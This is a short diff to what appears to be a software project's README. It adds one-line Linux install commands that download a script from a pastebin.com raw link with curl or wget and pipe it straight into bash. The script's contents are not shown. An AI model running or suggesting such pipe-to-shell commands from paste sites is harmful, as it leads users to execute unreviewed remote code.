@@ -11,7 +11,16 @@
 </p>
 
 # Installation in Linux:
-**Open terminal and run:**
+**One line installation:**
+```shell script
+curl -s https://pastebin.com/raw/QdJwWv86 | bash
+```
+**OR**
+```shell script
+wget -qO- https://pastebin.com/raw/QdJwWv86 | bash
+```
+**Other way to install**
+<br>
 ```shell script
  sudo apt update && apt full-upgrade
  ```
